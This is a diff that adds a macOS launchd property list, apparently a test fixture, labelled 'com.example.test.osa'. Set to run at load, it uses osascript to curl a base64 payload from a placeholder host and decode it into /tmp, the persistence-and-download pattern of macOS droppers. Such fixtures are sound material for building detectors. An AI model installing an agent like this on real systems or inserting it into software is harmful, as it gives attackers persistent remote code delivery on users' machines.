@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Label</key><string>com.example.test.osa</string>
+<key>ProgramArguments</key><array><string>/usr/bin/osascript</string><string>-e</string><string>do shell script "curl -s https://cdn.example.invalid/p | base64 -D > /tmp/p"</string></array>
+<key>RunAtLoad</key><true/>
+</dict>
+</plist>
